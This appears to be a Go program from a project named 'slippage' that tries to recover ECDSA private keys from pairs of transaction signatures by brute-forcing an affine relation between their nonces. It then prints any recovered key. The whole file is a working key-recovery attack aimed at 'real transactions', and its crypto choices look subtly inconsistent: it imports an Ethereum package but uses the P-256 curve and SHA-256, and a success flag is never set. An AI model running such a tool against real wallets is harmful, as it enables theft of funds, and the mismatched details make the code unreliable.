package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"time"

	"slippage/ethereum"
	"slippage/generator"
	"slippage/pattern"
	"slippage/solver"
)

// TransactionInfo transaction information (similar to main1.go)
type TransactionInfo struct {
	TxID    string `json:"tx_id"`
	From    string `json:"from"`
	To      string `json:"to"`
	Value   string `json:"value"`
	Nonce   uint64 `json:"nonce"`
	R       string `json:"r"`
	S       string `json:"s"`
	V       uint8  `json:"v"`
	Message string `json:"message"`
	Data    string `json:"data"`
}

// DataInfo address and public key information
type DataInfo struct {
	Address   string   `json:"address"`
	PublicKey string   `json:"public_key"`
	TxIDs     []string `json:"tx_ids"`
}

// RealTransactionExample example using real transactions
type RealTransactionExample struct {
	curve        elliptic.Curve
	data         *DataInfo
	transactions []*TransactionInfo
	minA         int64 // minimum value of a for brute-force (starting point)
	maxA         int64 // maximum value of a for brute-force
	minB         int64 // minimum value of b for brute-force (starting point)
	maxB         int64 // maximum value of b for brute-force
	maxWorkers   int   // maximum number of workers (0 = use default)
}

// NewRealTransactionExample create new example
func NewRealTransactionExample(curve elliptic.Curve) *RealTransactionExample {
	return &RealTransactionExample{
		curve: curve,
		minA:  1,  // default starting point
		maxA:  10, // default value
		minB:  0,  // default starting point for b
		maxB:  10, // default value
	}
}

// SetSearchRange set search range for brute-force
func (rte *RealTransactionExample) SetSearchRange(maxA, maxB int64) {
	rte.minA = 1 // default: starts from 1
	rte.maxA = maxA
	rte.minB = 0 // default: starts from 0
	rte.maxB = maxB
}

// SetSearchRangeWithMin set search range with minimum value of a
func (rte *RealTransactionExample) SetSearchRangeWithMin(minA, maxA, maxB int64) {
	rte.minA = minA
	rte.maxA = maxA
	rte.minB = 0 // default: starts from 0
	rte.maxB = maxB
}

// SetSearchRangeWithMinB set search range with minimum values of a and b
func (rte *RealTransactionExample) SetSearchRangeWithMinB(minA, maxA, minB, maxB int64) {
	rte.minA = minA
	rte.maxA = maxA
	rte.minB = minB
	rte.maxB = maxB
}

// SetMaxWorkers set maximum number of workers
func (rte *RealTransactionExample) SetMaxWorkers(maxWorkers int) {
	rte.maxWorkers = maxWorkers
}

// LoadFromJSON load data from JSON file
func (rte *RealTransactionExample) LoadFromJSON(filename string) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("error reading file: %v", err)
	}

	var info DataInfo
	if err := json.Unmarshal(data, &info); err != nil {
		return fmt.Errorf("error parsing JSON: %v", err)
	}

	rte.data = &info
	return nil
}

// LoadTransactionsFromJSON load transactions from JSON file
func (rte *RealTransactionExample) LoadTransactionsFromJSON(filename string) error {
	data, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("error reading file: %v", err)
	}

	var transactions []*TransactionInfo
	if err := json.Unmarshal(data, &transactions); err != nil {
		return fmt.Errorf("error parsing JSON: %v", err)
	}

	rte.transactions = transactions
	return nil
}

// ParsePublicKey convert public key from hex string
func (rte *RealTransactionExample) ParsePublicKey(publicKeyHex string) (*ecdsa.PublicKey, error) {
	// remove 0x if present
	if len(publicKeyHex) > 2 && publicKeyHex[:2] == "0x" {
		publicKeyHex = publicKeyHex[2:]
	}

	pubKeyBytes, err := hex.DecodeString(publicKeyHex)
	if err != nil {
		return nil, fmt.Errorf("error decoding hex: %v", err)
	}

	if len(pubKeyBytes) == 65 && pubKeyBytes[0] == 0x04 {
		// Uncompressed: 0x04 + x (32 bytes) + y (32 bytes)
		x := new(big.Int).SetBytes(pubKeyBytes[1:33])
		y := new(big.Int).SetBytes(pubKeyBytes[33:65])

		return &ecdsa.PublicKey{
			Curve: rte.curve,
			X:     x,
			Y:     y,
		}, nil
	} else if len(pubKeyBytes) == 33 {
		// Compressed: 0x02 or 0x03 + x (32 bytes)
		prefix := pubKeyBytes[0]
		if prefix != 0x02 && prefix != 0x03 {
			return nil, fmt.Errorf("invalid compressed public key format")
		}

		x := new(big.Int).SetBytes(pubKeyBytes[1:33])

		// calculate y from x for P256
		p := rte.curve.Params().P
		x3 := new(big.Int).Exp(x, big.NewInt(3), p)
		threeX := new(big.Int).Mul(x, big.NewInt(3))
		threeX.Mod(threeX, p)
		negThreeX := new(big.Int).Sub(p, threeX)
		b := new(big.Int)
		b.SetString("5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b", 16)
		y2 := new(big.Int).Add(x3, negThreeX)
		y2.Add(y2, b)
		y2.Mod(y2, p)

		y := new(big.Int).ModSqrt(y2, p)
		if y == nil {
			return nil, fmt.Errorf("cannot calculate y")
		}

		yIsOdd := y.Bit(0) == 1
		prefixIsOdd := prefix == 0x03
		if yIsOdd != prefixIsOdd {
			y.Sub(p, y)
		}

		return &ecdsa.PublicKey{
			Curve: rte.curve,
			X:     x,
			Y:     y,
		}, nil
	}

	return nil, fmt.Errorf("invalid public key length: %d bytes", len(pubKeyBytes))
}

// hexToBigInt convert hex string to big.Int
func (rte *RealTransactionExample) hexToBigInt(hexStr string) (*big.Int, error) {
	return ethereum.HexToBigInt(hexStr)
}

// hashMessage hash message
func (rte *RealTransactionExample) hashMessage(message []byte) *big.Int {
	hash := sha256.Sum256(message)
	z := new(big.Int).SetBytes(hash[:])
	n := rte.curve.Params().N
	z.Mod(z, n)
	return z
}

// FindPrivateKeyFromTransactions search for private key from transactions
// without knowing nonce - use brute-force to find affine relationship
func (rte *RealTransactionExample) FindPrivateKeyFromTransactions() (*big.Int, error) {
	if len(rte.transactions) < 2 {
		return nil, fmt.Errorf("at least 2 transactions required")
	}

	fmt.Println("Starting private key search...")
	fmt.Println("⚠️  Assumption: we don't know the nonce!")
	fmt.Printf("Number of transactions: %d\n\n", len(rte.transactions))

	// display transaction information
	for i, tx := range rte.transactions {
		fmt.Printf("Transaction %d:\n", i+1)
		fmt.Printf("  TX ID: %s\n", tx.TxID)
		fmt.Printf("  R: %s\n", tx.R)
		fmt.Printf("  S: %s\n", tx.S)
		fmt.Printf("  V: %d\n", tx.V)
		fmt.Println()
	}

	// check that r, s are valid
	validPairs := []struct {
		tx1, tx2 *TransactionInfo
		index    int
	}{}

	for i := 0; i < len(rte.transactions)-1; i++ {
		tx1 := rte.transactions[i]
		tx2 := rte.transactions[i+1]

		// check that r, s are valid
		if tx1.R == "0x0" || tx1.S == "0x0" || tx2.R == "0x0" || tx2.S == "0x0" {
			fmt.Printf("⚠️  Transactions %d and %d: r or s is not valid (placeholder)\n", i+1, i+2)
			continue
		}

		validPairs = append(validPairs, struct {
			tx1, tx2 *TransactionInfo
			index    int
		}{tx1, tx2, i})
	}

	if len(validPairs) == 0 {
		return nil, fmt.Errorf("no valid transaction pairs found")
	}

	fmt.Printf("✓ %d valid transaction pairs found\n\n", len(validPairs))

	// for each transaction pair, brute-force
	for pairIdx, pair := range validPairs {
		tx1 := pair.tx1
		tx2 := pair.tx2

		fmt.Printf("--- Checking transaction pair %d and %d ---\n", pair.index+1, pair.index+2)

		// convert signatures
		r1, err := rte.hexToBigInt(tx1.R)
		if err != nil {
			fmt.Printf("  ⚠️  Error converting r1: %v\n", err)
			continue
		}
		s1, err := rte.hexToBigInt(tx1.S)
		if err != nil {
			fmt.Printf("  ⚠️  Error converting s1: %v\n", err)
			continue
		}
		r2, err := rte.hexToBigInt(tx2.R)
		if err != nil {
			fmt.Printf("  ⚠️  Error converting r2: %v\n", err)
			continue
		}
		s2, err := rte.hexToBigInt(tx2.S)
		if err != nil {
			fmt.Printf("  ⚠️  Error converting s2: %v\n", err)
			continue
		}

		// check that r and s are not zero
		if r1.Sign() == 0 || s1.Sign() == 0 || r2.Sign() == 0 || s2.Sign() == 0 {
			fmt.Printf("  ⚠️  Warning: r or s is zero\n")
			continue
		}

		// calculate z (message hash)
		msg1, err := hex.DecodeString(tx1.Message)
		if err != nil {
			msg1 = []byte(tx1.Message)
		}
		msg2, err := hex.DecodeString(tx2.Message)
		if err != nil {
			msg2 = []byte(tx2.Message)
		}

		z1 := rte.hashMessage(msg1)
		z2 := rte.hashMessage(msg2)

		fmt.Printf("  z1 (message hash): %s\n", z1.String())
		fmt.Printf("  z2 (message hash): %s\n", z2.String())
		fmt.Printf("  r1: %s\n", r1.String())
		fmt.Printf("  s1: %s\n", s1.String())
		fmt.Printf("  r2: %s\n", r2.String())
		fmt.Printf("  s2: %s\n", s2.String())

		sig1 := generator.SignatureData{
			R: r1,
			S: s1,
			Z: z1,
		}
		sig2 := generator.SignatureData{
			R: r2,
			S: s2,
			Z: z2,
		}

		// Method 1: try common patterns (counter: k2 = k1 + 1)
		fmt.Printf("\n  Method 1: Checking Counter Pattern (k2 = k1 + 1)...\n")
		solverInstance := solver.NewSolver(rte.curve)
		privateKey, err := solverInstance.RecoverPrivateKey(
			sig1,
			sig2,
			big.NewInt(1), // a = 1
			big.NewInt(1), // b = 1 (k2 = 1*k1 + 1)
		)

		if err == nil {
			if rte.verifyPrivateKey(privateKey) {
				fmt.Printf("  ✓✓✓ Key found with Counter Pattern! ✓✓✓\n")
				fmt.Printf("  Relationship: k2 = k1 + 1\n")
				fmt.Printf("  Private key: %s\n", privateKey.String())
				return privateKey, nil
			}
		}

		// Method 2: brute-force affine relationship
		fmt.Printf("\n  Method 2: Brute-forcing Affine Relationship...\n")
		totalCombinations := (rte.maxA - rte.minA + 1) * (rte.maxB - rte.minB + 1)
		fmt.Printf("  Search range: a from %d to %d, b from %d to %d\n", rte.minA, rte.maxA, rte.minB, rte.maxB)
		fmt.Printf("  Number of combinations: %d\n", totalCombinations)

		bfs := pattern.NewBruteForceSolver(rte.curve)
		bfs.SetSearchRangeWithMinB(rte.minA, rte.maxA, rte.minB, rte.maxB)

		// limit number of workers to prevent excessive memory usage
		// MacBook M2 Pro Max usually has 8-10 cores, but to prevent OOM
		// we limit the number of workers
		maxWorkers := rte.maxWorkers
		if maxWorkers > 0 {
			bfs.SetWorkers(maxWorkers)
		} else {
			// use minimum number of workers to prevent OOM
			availableWorkers := bfs.GetWorkers()
			if availableWorkers > 8 {
				bfs.SetWorkers(8) // maximum 8 workers
			}
		}

		// display number of workers
		fmt.Printf("  Using multi-threading (workers: %d)\n", bfs.GetWorkers())
		fmt.Printf("  Starting search...\n\n")

		// use public key for verification
		expectedPubKey, err := rte.ParsePublicKey(rte.data.PublicKey)
		if err != nil {
			fmt.Printf("  ⚠️  Error parsing public key: %v\n", err)
			fmt.Printf("  Continuing without verification...\n")
			expectedPubKey = nil
		}

		var publicKeyX, publicKeyY *big.Int
		if expectedPubKey != nil {
			publicKeyX = expectedPubKey.X
			publicKeyY = expectedPubKey.Y
		}

		// start brute-force with progress logs
		fmt.Printf("  🔄 Starting brute-force...\n")
		results := bfs.BruteForceAffineRelationWithVerification(
			sig1,
			sig2,
			msg1,
			msg2,
			publicKeyX,
			publicKeyY,
		)

		// display progress
		var lastProgress int64 = 0
		progressInterval := totalCombinations / 20 // every 5%
		if progressInterval < 50 {
			progressInterval = 50 // minimum every 50 attempts
		}
		if progressInterval > 500 {
			progressInterval = 500 // maximum every 500 attempts
		}
		startTime := time.Now()
		lastLogTime := startTime
		logInterval := 5 * time.Second // log every 5 seconds (reduced)

		fmt.Printf("  ⏱️  Starting search at %s\n", startTime.Format("15:04:05"))
		fmt.Printf("  📋 Log displayed every %d attempts or every 5 seconds\n", progressInterval)

		found := false
		heartbeatTicker := time.NewTicker(10 * time.Second) // heartbeat every 10 seconds (reduced)
		defer heartbeatTicker.Stop()

		done := make(chan bool)
		var lastAttempts int64 = 0

		// Goroutine to display heartbeat (in one line)
		go func() {
			for {
				select {
				case <-heartbeatTicker.C:
					elapsed := time.Since(startTime)
					// use \r to overwrite previous line
					fmt.Printf("\r  💓 Heartbeat: working... (time: %.1f seconds, attempts: %d)    ",
						elapsed.Seconds(), lastAttempts)
				case <-done:
					return
				}
			}
		}()

		for result := range results {
			lastAttempts = result.Attempts

			// initial log to ensure it's working
			if result.Attempts == 1 {
				fmt.Printf("  ✓ First attempt completed\n")
			}
			// display progress (using \r to overwrite previous line)
			if result.Attempts > 0 {
				progress := (result.Attempts * 100) / totalCombinations
				elapsed := time.Since(startTime)
				elapsedSeconds := elapsed.Seconds()
				timeSinceLastLog := time.Since(lastLogTime)

				// calculate speed and remaining time (with zero division check)
				var rate float64 = 0
				var remaining float64 = 0
				if elapsedSeconds > 0 {
					rate = float64(result.Attempts) / elapsedSeconds
					if rate > 0 {
						remaining = float64(totalCombinations-result.Attempts) / rate
					}
				}

				// display a and b (with nil check) - only first few digits
				aStr := "?"
				bStr := "?"
				if result.A != nil {
					aStr = result.A.String()
					if len(aStr) > 10 {
						aStr = aStr[:10] + "..."
					}
				}
				if result.B != nil {
					bStr = result.B.String()
					if len(bStr) > 10 {
						bStr = bStr[:10] + "..."
					}
				}

				// display log in two cases:
				// 1. every progressInterval attempts
				// 2. every logInterval seconds (to ensure program is working)
				shouldLog := result.Attempts-lastProgress >= progressInterval ||
					progress >= 100 ||
					timeSinceLastLog >= logInterval

				if shouldLog {
					// use \r to overwrite previous line (prevent overflow)
					if rate > 0 {
						fmt.Printf("\r  📊 %d/%d (%.1f%%) | %.0f combos/sec | ~%.0f sec remaining | a=%s, b=%s    ",
							result.Attempts, totalCombinations,
							float64(result.Attempts)*100.0/float64(totalCombinations),
							rate,
							remaining,
							aStr, bStr)
					} else {
						fmt.Printf("\r  📊 %d/%d (%.1f%%) | a=%s, b=%s    ",
							result.Attempts, totalCombinations,
							float64(result.Attempts)*100.0/float64(totalCombinations),
							aStr, bStr)
					}
					lastProgress = result.Attempts
					lastLogTime = time.Now()
				}
			}

			if result.Success {
				// add newline before success message
				fmt.Printf("\n")
				fmt.Printf("  ✓ Relationship found!\n")
				fmt.Printf("    a = %s\n", result.A.String())
				fmt.Printf("    b = %s\n", result.B.String())
				fmt.Printf("    Recovered key: %s\n", result.PrivateKey.String())
				fmt.Printf("    Attempts: %d of %d\n", result.Attempts, totalCombinations)

				// verify
				if rte.verifyPrivateKey(result.PrivateKey) {
					fmt.Printf("\n  ✓✓✓ Key is correct! ✓✓✓\n")
					fmt.Printf("  Affine relationship: k2 = %s*k1 + %s\n", result.A.String(), result.B.String())
					return result.PrivateKey, nil
				} else {
					fmt.Printf("  ⚠️  Recovered key does not match public key\n")
					fmt.Printf("  Continuing search...\n")
					// continue to find correct relationship
				}
			}
		}

		// stop heartbeat
		close(done)

		// add newline to ensure last line is not overwritten
		fmt.Printf("\n")

		// if channel closed and no result found
		if !found {
			elapsed := time.Since(startTime)
			fmt.Printf("  ✗ Affine relationship not found in search range\n")
			fmt.Printf("  Time spent: %.2f seconds\n", elapsed.Seconds())
			fmt.Printf("  Last attempt: %d of %d\n", lastAttempts, totalCombinations)
		}

		elapsed := time.Since(startTime)
		fmt.Printf("  ⏱️  Search completed at %s (time: %.2f seconds)\n",
			time.Now().Format("15:04:05"), elapsed.Seconds())

		// if this pair didn't work, try next pair
		if pairIdx < len(validPairs)-1 {
			fmt.Println()
		}
	}

	return nil, fmt.Errorf("cannot find private key - may need larger search range")
}

// verifyPrivateKey verify private key using public key
func (rte *RealTransactionExample) verifyPrivateKey(privateKey *big.Int) bool {
	if rte.data == nil || rte.data.PublicKey == "" {
		return false
	}

	// calculate public key from private key
	pubX, pubY := rte.curve.ScalarBaseMult(privateKey.Bytes())

	// compare with provided public key
	expectedPubKey, err := rte.ParsePublicKey(rte.data.PublicKey)
	if err != nil {
		return false
	}

	return pubX.Cmp(expectedPubKey.X) == 0 && pubY.Cmp(expectedPubKey.Y) == 0
}

func main() {
	fmt.Println("=== Example: Key Recovery from Real Transactions ===")
	fmt.Println()

	// parse command-line arguments
	var minA, maxA, minB, maxB int64 = 1, 10, 0, 10 // default values
	var maxWorkers int = 0                          // 0 = use default
	var dataFile, txFile string = "example_data.json", "transactions.json"

	if len(os.Args) > 1 {
		// display help
		if os.Args[1] == "--help" || os.Args[1] == "-h" {
			fmt.Println("Usage:")
			fmt.Println("  go run real_transaction_example.go [--minA <value>] [--maxA <value>] [--minB <value>] [--maxB <value>] [--workers <num>] [--data <file>] [--tx <file>]")
			fmt.Println("\nOptions:")
			fmt.Println("  --minA <value>    minimum value of a for brute-force - starting point (default: 1)")
			fmt.Println("  --maxA <value>    maximum value of a for brute-force (default: 10)")
			fmt.Println("  --minB <value>    minimum value of b for brute-force - starting point (default: 0)")
			fmt.Println("  --maxB <value>    maximum value of b for brute-force (default: 10)")
			fmt.Println("  --workers <num>  number of workers for multi-threading (default: min(8, CPU cores))")
			fmt.Println("  --data <file>     data file (default: example_data.json)")
			fmt.Println("  --tx <file>       transactions file (default: transactions.json)")
			fmt.Println("\nExample:")
			fmt.Println("  go run real_transaction_example.go --maxA 50 --maxB 50")
			fmt.Println("  go run real_transaction_example.go --minA 5 --maxA 50 --minB 1 --maxB 50")
			fmt.Println("  go run real_transaction_example.go --maxA 100 --maxB 100 --workers 4")
			fmt.Println("  go run real_transaction_example.go --minA 10 --maxA 100 --minB 5 --maxB 100 --data my_data.json")
			fmt.Println("\n⚠️  Note: limit number of workers to prevent signal: killed")
			os.Exit(0)
		}

		// parse arguments
		for i := 1; i < len(os.Args); i++ {
			switch os.Args[i] {
			case "--minA":
				if i+1 < len(os.Args) {
					fmt.Sscanf(os.Args[i+1], "%d", &minA)
					i++
				}
			case "--maxA", "-a":
				if i+1 < len(os.Args) {
					fmt.Sscanf(os.Args[i+1], "%d", &maxA)
					i++
				}
			case "--minB":
				if i+1 < len(os.Args) {
					fmt.Sscanf(os.Args[i+1], "%d", &minB)
					i++
				}
			case "--maxB", "-b":
				if i+1 < len(os.Args) {
					fmt.Sscanf(os.Args[i+1], "%d", &maxB)
					i++
				}
			case "--workers", "-w":
				if i+1 < len(os.Args) {
					fmt.Sscanf(os.Args[i+1], "%d", &maxWorkers)
					i++
				}
			case "--data", "-d":
				if i+1 < len(os.Args) {
					dataFile = os.Args[i+1]
					i++
				}
			case "--tx", "-t":
				if i+1 < len(os.Args) {
					txFile = os.Args[i+1]
					i++
				}
			}
		}
	}

	// use P256 curve
	curve := elliptic.P256()
	example := NewRealTransactionExample(curve)

	// set search range
	example.SetSearchRangeWithMinB(minA, maxA, minB, maxB)
	if maxWorkers > 0 {
		example.SetMaxWorkers(maxWorkers)
		fmt.Printf("Search range set: a from %d to %d, b from %d to %d\n", minA, maxA, minB, maxB)
		fmt.Printf("Possible combinations: %d\n", (maxA-minA+1)*(maxB-minB+1))
		fmt.Printf("Number of workers: %d\n\n", maxWorkers)
	} else {
		fmt.Printf("Search range set: a from %d to %d, b from %d to %d\n", minA, maxA, minB, maxB)
		fmt.Printf("Possible combinations: %d\n", (maxA-minA+1)*(maxB-minB+1))
		fmt.Printf("Number of workers: auto (max 8 to prevent OOM)\n\n")
	}

	// load data
	fmt.Printf("Loading data from %s...\n", dataFile)
	if err := example.LoadFromJSON(dataFile); err != nil {
		fmt.Printf("Error loading %s: %v\n", dataFile, err)
		os.Exit(1)
	}

	fmt.Printf("Address: %s\n", example.data.Address)
	fmt.Printf("Public key: %s\n", example.data.PublicKey)
	fmt.Printf("Number of TX IDs: %d\n\n", len(example.data.TxIDs))

	// load transactions
	fmt.Printf("Loading transactions from %s...\n", txFile)
	if err := example.LoadTransactionsFromJSON(txFile); err != nil {
		fmt.Printf("Error loading %s: %v\n", txFile, err)
		os.Exit(1)
	}

	fmt.Printf("✓ %d transactions loaded\n\n", len(example.transactions))

	// search for private key
	privateKey, err := example.FindPrivateKeyFromTransactions()
	if err != nil {
		fmt.Printf("\n✗ Error: %v\n", err)
		fmt.Printf("\n💡 Tip: may need to increase search range\n")
		fmt.Printf("   Example: go run real_transaction_example.go --maxA 50 --maxB 50\n")
		os.Exit(1)
	}

	fmt.Printf("\n✓✓✓ Private key found! ✓✓✓\n")
	fmt.Printf("Private key: %s\n", privateKey.String())
	fmt.Printf("Private key (hex): 0x%x\n", privateKey.Bytes())
}
